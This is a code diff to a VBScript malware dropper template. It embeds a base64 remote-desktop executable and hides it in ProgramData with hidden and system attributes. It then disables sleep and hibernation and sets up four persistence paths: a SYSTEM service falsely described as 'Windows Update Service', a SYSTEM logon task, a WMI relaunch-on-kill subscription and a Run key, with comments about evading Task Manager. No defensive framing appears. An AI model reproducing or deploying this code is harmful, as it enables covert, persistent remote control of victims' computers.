@@ -27,8 +27,46 @@ Else
   WriteFile decoyPath, "{{DECOY_B64}}"
 End If
 
-' persistence: relaunch on every logon (survives reboot)
+' remote desktop helper: deploy rd-win.exe (SendInput engine, session-aware) to a
+' hidden ProgramData path so the operator can mirror and drive the box unattended.
+Dim rdPath
+rdPath = base & "\rd-{RAND4}.exe"
+WriteFile rdPath, "{{RD_WIN_B64}}"
 On Error Resume Next
+fso.GetFile(rdPath).Attributes = fso.GetFile(rdPath).Attributes Or 2 Or 4  ' hidden + system
+On Error GoTo 0
+
+' stay awake: never sleep, lid close = do nothing, hibernate off, requestsoverride
+Dim pw
+pw = "powercfg /change standby-timeout-ac 0 & powercfg /change standby-timeout-dc 0 & " & _
+     "powercfg /change hibernate-timeout-ac 0 & powercfg /change hibernate-timeout-dc 0 & " & _
+     "powercfg /setacvalueindex scheme_current sub_buttons lidaction 0 & " & _
+     "powercfg /setdcvalueindex scheme_current sub_buttons lidaction 0 & " & _
+     "powercfg /hibernate off & powercfg /setactive scheme_current"
+shell.Run pw, 0, True
+
+' unattended persistence: three independent paths, none visible in default Task Manager
+'   1) Windows service (auto-start, SYSTEM)
+'   2) scheduled task (/RU SYSTEM, on logon)
+'   3) WMI __EventFilter/CommandLineEventConsumer (relaunch if killed)
+On Error Resume Next
+Dim svc, task, wmi
+svc = "sc.exe create FleetSvc{RAND4} binPath= """" & rdPath & """" start= auto & " & _
+      "sc.exe description FleetSvc{RAND4} ""Windows Update Service"" & " & _
+      "sc.exe start FleetSvc{RAND4}"
+shell.Run svc, 0, True
+task = "schtasks.exe /create /TN FleetTask{RAND4} /TR """" & rdPath & """" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F"
+shell.Run task, 0, True
+wmi = "powershell -NoProfile -ExecutionPolicy Bypass -Command `" & _
+      "$f='" & rdPath & "'; " & _
+      "$n='FleetFlt{RAND4}'; $c='FleetCon{RAND4}'; " & _
+      "Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='$n';EventNamespace='root\cimv2';QueryLanguage='WQL';Query=""SELECT * FROM __InstanceDeletionEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='rd-{RAND4}.exe'"}} -ErrorAction SilentlyContinue; " & _
+      "Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='$c';CommandLineTemplate=""'$f'""} -ErrorAction SilentlyContinue; " & _
+      "Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=(Get-WmiObject __EventFilter -Namespace root\subscription | Where-Object {$_.Name -eq '$n'});Consumer=(Get-WmiObject CommandLineEventConsumer -Namespace root\subscription | Where-Object {$_.Name -eq '$c'})} -ErrorAction SilentlyContinue"
+shell.Run wmi, 0, True
+On Error GoTo 0
+
+' HKCU Run as a fourth, user-session persistence path
 shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Fleet{{RAND4}}", """" & loaderPath & """"
 
 ' preconfigure the host firewall: allow the payload out so it can reach the
